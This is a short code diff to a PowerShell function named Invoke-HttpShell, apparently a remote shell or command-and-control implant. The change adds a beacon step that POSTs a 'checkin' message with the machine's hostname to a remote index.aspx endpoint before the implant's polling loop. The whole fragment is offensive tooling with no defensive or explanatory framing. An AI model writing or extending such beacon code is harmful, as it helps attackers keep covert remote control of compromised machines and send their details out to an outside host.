@@ -81,6 +81,11 @@ function Invoke-HttpShell
 
         $sleep = 2
 
+        $wc.Headers.Add("User-Agent", $UserAgent)
+        $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $wc.Headers.Add("Accept", "text/plain")
+        $wc.UploadString($uri + "index.aspx", "POST", "checkin:" + $(hostname))
+
         while ($True) {
             $wc.Headers.Add("User-Agent", $UserAgent)
             $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
